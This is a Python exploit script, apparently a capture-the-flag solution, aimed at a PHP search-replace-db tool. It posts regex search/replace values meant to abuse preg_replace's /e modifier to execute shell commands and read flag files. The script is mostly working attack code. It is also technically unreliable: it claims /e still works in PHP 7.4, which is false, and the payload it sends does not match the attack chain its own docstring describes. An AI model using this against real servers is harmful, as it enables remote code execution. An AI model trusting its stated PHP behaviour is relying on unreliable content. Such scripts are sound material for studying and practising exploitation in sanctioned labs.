#!/usr/bin/env python3
"""
HITCON 2026 Wargame - interconnectit/search-replace-db 3.1.0 (PHP 7.4.33)
Vulnerability: preg_replace with user-controlled $search and $replace

index.php passes $_POST['search'] and $_POST['replace'] directly to
preg_replace($search, $replace, $string) in srdb.class.php line 1174.
When regex mode is enabled and the search pattern contains the /e modifier,
PHP evaluates the replacement string as code. In PHP 7.4, /e is deprecated
but still works with a deprecation warning.

Attack chain:
  1. POST to index.php with regex=1, search=/x/e, replace=system('/readflag')
  2. preg_replace executes system('/readflag') on each DB table row
  3. Flags appear in the output
"""
import sys
import requests


def main():
    if len(sys.argv) != 2:
        print("Usage: " + sys.argv[0] + " <challenge-host>", file=sys.stderr)
        return 64

    host = sys.argv[1]
    base = "http://" + host
    target = base + "/vendor/interconnectit/search-replace-db/index.php"

    print("[*] Target: " + target)

    # Step 1: Test preg_replace with /e modifier
    # In regex mode, search becomes /<pattern>/<mods>
    # We need regex=1 and the /e modifier
    for cmd in ["cat /flag1", "/readflag"]:
        print("[*] Executing: " + cmd)
        data = {
            "name": "",
            "user": "",
            "pass": "",
            "host": "127.0.0.1",
            "port": "3306",
            "charset": "utf8",
            "search": "x/e",
            "replace": cmd,
            "regex": "1",
            "tables[]": "test",
            "dry_run": "0",
            "submit[dryrun]": "dryrun",
            "ajax": "1",
        }
        try:
            r = requests.post(target, data=data, timeout=15)
            print("[*] Response: HTTP " + str(r.status_code) + " len=" + str(len(r.text)))
            # Check for output
            for line in r.text.split("\n"):
                line = line.strip()
                if line and "FLAG" in line.upper():
                    print("[+] FLAG: " + line)
            if "FLAG" in r.text:
                return 0
        except Exception as e:
            print("[!] Error: " + str(e))

    # Step 2: If /e doesn't work, try alternative approach
    # Check if the response contains useful info
    print("[*] Checking response content...")
    try:
        r = requests.post(target, data={
            "submit[dryrun]": "dryrun",
            "ajax": "1",
        }, timeout=15)
        print("[*] Dry run response:")
        for line in r.text.split("\n"):
            line = line.strip()
            if line and len(line) < 500 and not line.startswith("<"):
                print("    " + line)
    except Exception as e:
        print("[!] Error: " + str(e))

    return 1


if __name__ == "__main__":
    raise SystemExit(main())
